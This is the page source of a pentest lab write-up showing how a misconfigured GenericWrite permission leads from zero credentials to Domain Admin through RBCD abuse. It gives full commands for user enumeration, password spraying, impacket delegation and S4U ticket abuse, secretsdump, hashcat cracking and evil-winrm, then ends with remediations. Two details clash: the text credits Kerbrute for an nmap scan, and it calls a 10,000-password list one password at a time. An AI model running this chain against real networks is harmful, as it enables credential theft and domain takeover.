---
import Writeup from "../../layouts/Writeup.astro";

const img = "/writeups/rbcd";
---

<Writeup
  title="AD Pentest — RBCD to Domain Admin"
  description="Full Active Directory attack chain from zero credentials to Domain Admin via Resource-Based Constrained Delegation abuse. No CVE, no software exploit — just misconfigured permissions."
  date="2026-04-27"
  tags={["Active Directory", "RBCD", "BloodHound", "Kerberos", "Pentest Lab"]}
  slug="rbcd"
>
  <Fragment slot="title">
    From <span class="text-[var(--color-accent)]">Zero Creds</span> to Domain Admin
    via RBCD
  </Fragment>

  <!-- ═══ LAB ENVIRONMENT ═══ -->
  <h2>Lab Environment</h2>

  <table>
    <thead><tr><th>Component</th><th>Value</th></tr></thead>
    <tbody>
      <tr><td>Domain</td><td>corp.local</td></tr>
      <tr><td>Domain Controller</td><td>192.168.1.10 (DC)</td></tr>
      <tr><td>Target Workstation</td><td>192.168.1.20 (WS01)</td></tr>
      <tr><td>Target User</td><td>zouhair</td></tr>
      <tr><td>OS</td><td>Windows Server 2022 Build 20348 x64</td></tr>
      <tr><td>Attacker</td><td>Kali Linux</td></tr>
    </tbody>
  </table>

  <div class="callout callout-warn">
    <strong> LAB SETUP</strong>
    Two intentional misconfigurations were applied: (1) <code>zouhair</code> was granted
    <code>GenericWrite</code> over the WS01 computer object, and (2) the AD structure
    includes an IT group with delegated rights over workstations — a realistic shortcut
    common in real environments.
  </div>

  <figure>
    <img src={`${img}/ad-users.png`} alt="AD Users" loading="lazy" /><figcaption
    >
      AD Users — zouhair account in the domain
    </figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-computers.png`}
      alt="AD Computers"
      loading="lazy"
    /><figcaption>AD Computers — WS01 visible in domain</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-employees.png`}
      alt="AD Employees"
      loading="lazy"
    /><figcaption>AD Employees OU structure</figcaption>
  </figure>

  <!-- ═══ PHASE 1: RECONNAISSANCE ═══ -->
  <h2>Phase 1 — Reconnaissance</h2>

  <p>
    Starting with a blank slate no credentials, no knowledge of the environment.
    The first step is discovering what's on the network and identifying the
    Domain Controller.
  </p>

  <h3>Network Discovery</h3>

  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmt"># SYN scan to identify live hosts and open ports</span>
<span class="cmd">nmap</span> <span class="arg">-sS</span> 192.168.1.0/24</pre>
  </div>

  <figure>
    <img
      src={`${img}/ad-recon-identify-hosts.png`}
      alt="Nmap scan"
      loading="lazy"
    /><figcaption>
      nmap SYN scan — DC and WS01 identified on the network
    </figcaption>
  </figure>

  <p>
    The scan reveals two live hosts. <strong>192.168.1.10</strong> exposes ports 88,
    389, 445, 3268 a classic AD Domain Controller fingerprint. <strong
      >192.168.1.20</strong
    > is WS01.
  </p>

  <h3>User Enumeration via Kerberos</h3>

  <p>
    Using the nmap <code>krb5-enum-users</code> script, we probe the DC's Kerberos
    port to enumerate valid domain accounts without any credentials.
  </p>

  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmt"># Probe Kerberos for valid usernames</span>
<span class="cmd">nmap</span> <span class="arg">-p 88</span> --script=krb5-enum-users --script-args krb5-enum-users.realm=corp.local,userdb=/usr/share/seclists/Username/Names/names.txt 192.168.1.10</pre>
  </div>

  <figure>
    <img
      src={`${img}/ad-recon-users.png`}
      alt="User enumeration"
      loading="lazy"
    /><figcaption>
      krb5-enum-users — valid Kerberos principals discovered
    </figcaption>
  </figure>

  <div class="callout callout-info">
    <strong>HOW IT WORKS</strong>
    Kerbrute sends AS-REQ packets to the DC. A valid user triggers <code
      >KDC_ERR_PREAUTH_REQUIRED</code
    >, while an invalid one returns <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>. No
    lockout risk, no credentials needed.
  </div>

  <!-- ═══ PHASE 2: PASSWORD SPRAYING ═══ -->
  <h2>Phase 2 — Password Spraying</h2>

  <p>
    With a valid username list, we spray common passwords against SMB. Spraying
    one password at a time to avoid lockout.
  </p>

  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmd">netexec</span> smb 192.168.1.10 <span class="arg">-u</span> users.txt <span class="arg">-p</span> /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt --continue-on-success</pre>
  </div>

  <figure>
    <img
      src={`${img}/ad-password-spraying-1.png`}
      alt="Password spraying"
      loading="lazy"
    /><figcaption>Password spraying in progress</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-password-spraying-2.png`}
      alt="Password found"
      loading="lazy"
    /><figcaption>[+] Hit — corp.local\zouhair:Password123</figcaption>
  </figure>

  <div class="callout callout-success">
    <strong> CREDENTIALS OBTAINED</strong>
    <code>corp.local\zouhair : Password123</code>
  </div>

  <h3>Validate on WS01</h3>

  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmd">netexec</span> smb 192.168.1.20 <span class="arg">-u</span> zouhair <span class="arg">-p</span> <span class="str">'Password123'</span></pre>
  </div>

  <figure>
    <img
      src={`${img}/ad-test-password.png`}
      alt="WS01 auth"
      loading="lazy"
    /><figcaption>zouhair authenticates — [+] but no (Pwn3d!)</figcaption>
  </figure>

  <p>
    The account authenticates but has no administrative access to WS01. This is
    where privilege escalation begins.
  </p>

  <!-- ═══ PHASE 3: BLOODHOUND ═══ -->
  <h2>Phase 3 — BloodHound Enumeration</h2>

  <p>
    With valid credentials, we collect the entire AD graph using BloodHound.
    This reveals relationships, permissions, and attack paths invisible to
    normal enumeration.
  </p>

  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmd">bloodhound-python</span> <span class="arg">-u</span> zouhair <span class="arg">-p</span> <span class="str">'Password123'</span> <span class="arg">-d</span> corp.local <span class="arg">-ns</span> 192.168.1.10  <span class="arg">-c</span> All --zip</pre>
  </div>
  <figure>
    <img
      src={`${img}/ad-enumeration-bloodhound.png`}
      alt="Full graph"
      loading="lazy"
    /><figcaption>BloodHound — full AD enumeration graph</figcaption>
  </figure>
  <h3>Critical Finding — GenericWrite on WS01</h3>

  <figure>
    <img
      src={`${img}/ad-bloodhound-gui.png`}
      alt="BloodHound"
      loading="lazy"
    /><figcaption>BloodHound GUI — Uploading the ZIP file</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-bloodhound-object-info.png`}
      alt="Object info"
      loading="lazy"
    /><figcaption>WS01 object information</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-bloodhound-outbound-control-genericwrite.png`}
      alt="GenericWrite"
      loading="lazy"
    /><figcaption>
      Outbound control — zouhair has GenericWrite over WS01
    </figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-bloodhound-inbound.png`}
      alt="Inbound control"
      loading="lazy"
    /><figcaption>Inbound control rights on WS01</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-bloodhound-user-membership.png`}
      alt="User membership"
      loading="lazy"
    /><figcaption>zouhair's group membership — member of IT group</figcaption>
  </figure>
  <p>
    After uploading the ZIP file, it is time to analyze what we can do with the
    user and to define a path to compromise the entire domain. From the
    screenshots, we notice that the user ZOUHAIR@CORP.LOCAL is a member of the
    Domain Users group and the IT group. The user has <code>GenericWrite</code> over
    <code>WS01.CORP.LOCAL</code>, inherited through IT group membership. This
    allows writing to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute,
    which leads to an RBCD attack.
  </p>

  <!-- ═══ PHASE 4: RBCD SETUP ═══ -->
  <h2>Phase 4 — RBCD Attack Setup</h2>

  <p>
    Resource-Based Constrained Delegation (RBCD) allows a computer object to
    specify which accounts can impersonate users to it. Since <code
      >zouhair</code
    > has <code>GenericWrite</code> over WS01, we can write this attribute ourselves.
  </p>

  <h3>Create a Controlled Machine Account</h3>

  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmd">impacket-addcomputer</span> corp.local/zouhair:<span class="str">'Password123'</span> <span class="arg">-dc-ip</span> 192.168.1.10 <span class="arg">-computer-name</span> <span class="str">'ZXGR$'</span> <span class="arg">-computer-pass</span> <span class="str">'Active@123!'</span></pre>
  </div>

  <figure>
    <img
      src={`${img}/ad-addingcomputer-impacket.png`}
      alt="Machine account"
      loading="lazy"
    /><figcaption>ZXGR$ machine account created successfully</figcaption>
  </figure>

  <h3>Write RBCD Delegation Attribute</h3>

  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmd">impacket-rbcd</span> corp.local/zouhair:<span class="str">'Password123'</span> <span class="arg">-dc-ip</span> 192.168.1.10 <span class="arg">-action</span> write <span class="arg">-delegate-to</span> <span class="str">'WS01$'</span> <span class="arg">-delegate-from</span> <span class="str">'ZXGR$'</span></pre>
  </div>

  <figure>
    <img
      src={`${img}/ad-delegate-write.png`}
      alt="RBCD write"
      loading="lazy"
    /><figcaption>RBCD write — delegation rights modified on WS01</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-delegate-verification.png`}
      alt="RBCD verify"
      loading="lazy"
    /><figcaption>RBCD read — ZXGR$ confirmed in delegation list</figcaption>
  </figure>

  <div class="callout callout-info">
    <strong> WHAT HAPPENED</strong>
    WS01's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> now includes <code
      >ZXGR$</code
    >. This instructs the KDC: <em
      >"trust ZXGR$ to impersonate any user to this machine"</em
    >.
  </div>

  <!-- ═══ PHASE 5: S4U ═══ -->
  <h2>Phase 5 — Kerberos Impersonation (S4U)</h2>

  <p>
    This phase involves using S4U2Self and S4U2Proxy. We request a service
    ticket for <code>cifs/WS01</code> while impersonating <code
      >Administrator</code
    >, without ever knowing the Administrator's password.
  </p>
  <p>
    Then we use the cached ticket to authenticate to the machine as
    Administrator.
  </p>

  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmd">impacket-getST</span> corp.local/<span class="str">'ZXGR$'</span>:<span class="str">'Active@123!'</span> <span class="arg">-dc-ip</span> 192.168.1.10 <span class="arg">-spn</span> cifs/WS01.corp.local <span class="arg">-impersonate</span> Administrator

<span class="cmd">export</span> KRB5CCNAME=Administrator@cifs_WS01.corp.local@CORP.LOCAL.ccache
<span class="cmd">impacket-wmiexec</span> <span class="arg">-k -no-pass</span> Administrator@WS01.corp.local</pre>
  </div>

  <figure>
    <img
      src={`${img}/ad-impersonate-admin-s4u.png`}
      alt="S4U"
      loading="lazy"
    /><figcaption>
      S4U impersonation — forged service ticket for Administrator
    </figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-export-ccache-file.png`}
      alt="ccache"
      loading="lazy"
    /><figcaption>Exporting Kerberos ccache file</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-ws01-compromised.png`}
      alt="WS01 shell"
      loading="lazy"
    /><figcaption>Administrator shell obtained on WS01</figcaption>
  </figure>

  <!-- ═══ PHASE 6: CREDENTIAL DUMPING ═══ -->
  <h2>Phase 6 — Credential Dumping</h2>
  <p>
    In this phase, after obtaining a valid ticket, we leverage it to access the
    workstation and dump cached credentials using <code>impacket</code>. The
    goal is to extract NTLM/DCC2 hashes without requiring plaintext passwords.
    Once the hashes are collected, we perform offline cracking using <code
      >hashcat</code
    > with a wordlist. This step allows us to recover weak credentials, in this case
    leading to the Administrator password, which gives us full control over the machine
    and moves us closer to compromising the domain.
  </p>
  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre><span class="cmd">impacket-secretsdump</span> <span class="arg">-k -no-pass</span> WS01.corp.local

<span class="cmt"># Crack DCC2 hash</span>
<span class="cmd">hashcat</span> <span class="arg">-m 2100 -a 0</span> admin_hash /usr/share/seclists/Passwords/corporate_passwords.txt --force</pre>
  </div>

  <figure>
    <img
      src={`${img}/ad-dumping-hashes.png`}
      alt="Dumping hashes"
      loading="lazy"
    /><figcaption>Dumping cached credentials from WS01</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-cracking-hash.png`}
      alt="Cracking"
      loading="lazy"
    /><figcaption>Hashcat cracking DCC2 hash offline</figcaption>
  </figure>
  <figure>
    <img
      src={`${img}/ad-cracked-hash.png`}
      alt="Cracked"
      loading="lazy"
    /><figcaption>Hash cracked — Administrator password recovered</figcaption>
  </figure>

  <div class="callout callout-success">
    <strong> ADMINISTRATOR PASSWORD</strong>
    <code>P@ssw0rd123!</code> recovered via offline dictionary attack.
  </div>

  <!-- ═══ PHASE 7: DC COMPROMISE ═══ -->
  <h2>Phase 7 — Domain Controller Compromise</h2>
  <p>
    In this phase, using the recovered Administrator credentials, we directly
    authenticate to the Domain Controller via <code>evil-winrm</code>. At this
    point, we have full administrative access over the domain. From there, we
    perform a DCSync attack to dump all domain hashes, including the <code
      >krbtgt</code
    > account. This effectively means the domain is fully compromised, and we can
    forge Golden Tickets for persistent and unrestricted access.
  </p>
  <div class="code-block">
    <div class="code-bar">
      <div class="code-dots"><span></span><span></span><span></span></div>
      <span class="code-label">bash</span>
    </div>
    <pre>
<span class="cmd">evil-winrm</span> <span class="arg">-i</span> 192.168.1.10 <span class="arg">-u</span> Administrator <span class="arg">-p</span> <span class="str">'P@ssw0rd123!'</span></pre>
  </div>

  <figure>
    <img src={`${img}/ad-proof-dc.png`} alt="Proof" loading="lazy" /><figcaption
    >
      Proof of Domain Controller compromise
    </figcaption>
  </figure>
  <figure>
    <img src={`${img}/ad-pwnd.png`} alt="Pwned" loading="lazy" /><figcaption>
      Domain fully compromised — all hashes obtained
    </figcaption>
  </figure>

  <hr />

  <!-- ═══ CONCLUSION ═══ -->
  <h2 id="conclusion">Recommendations & Takeaways</h2>

  <p>
    This lab demonstrates that <strong>a single misconfiguration</strong> can cascade
    into a <strong>full domain compromise</strong>.
  </p>

  <table>
    <thead><tr><th>Vulnerability</th><th>Remediation</th></tr></thead>
    <tbody>
      <tr
        ><td>GenericWrite on computer objects</td><td
          >Audit and remove excessive ACLs. Apply least privilege.</td
        ></tr
      >
      <tr
        ><td>Weak password (Password123)</td><td
          >Enforce password complexity. Minimum 12 chars, lockout after 5
          attempts.</td
        ></tr
      >
      <tr
        ><td>Machine Account Quota = 10</td><td
          >Set ms-DS-MachineAccountQuota to 0 for standard users.</td
        ></tr
      >
      <tr
        ><td>RBCD abuse</td><td
          >Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity in SIEM.</td
        ></tr
      >
      <tr
        ><td>DCC2 crackable offline</td><td
          >Limit cached logons. Use Protected Users group for admin accounts.</td
        ></tr
      >
      <tr
        ><td>No detection</td><td
          >Deploy Microsoft Defender for Identity (MDI).</td
        ></tr
      >
    </tbody>
  </table>

  <div class="callout callout-warn">
    <strong>KEY INSIGHT</strong>
    This entire chain exploits <em>no software vulnerability</em>. Every step
    abused a misconfigured permission or a weak password. <strong
      >Active Directory security is configuration security.</strong
    >
  </div>
</Writeup>
